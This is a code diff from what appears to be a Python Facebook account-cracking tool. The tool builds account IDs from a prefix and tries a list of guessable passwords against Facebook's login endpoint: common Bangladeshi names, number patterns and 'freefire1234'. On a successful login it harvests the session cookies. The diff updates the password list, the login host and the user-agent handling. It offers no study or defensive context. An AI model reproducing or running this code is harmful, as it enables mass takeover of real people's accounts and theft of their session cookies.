@@ -227,7 +227,7 @@ def xxr():
         print(f' \033[1;91m[\033[1;97m✅\033[1;91m]\033[38;5;46m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙄𝘿:\033[38;5;46m {xr}'+tl)
         print('\033[38;5;46m══════════════════════════════════')              
         for love in user:
-            pwx = [love[1:]]
+            pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
             uid = code+love
             for Eman in Emran:
                 pwx.append(Eman)
@@ -274,10 +274,8 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'same-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-            'viewport-width': '980',
-}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            'user-agent': pro}
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
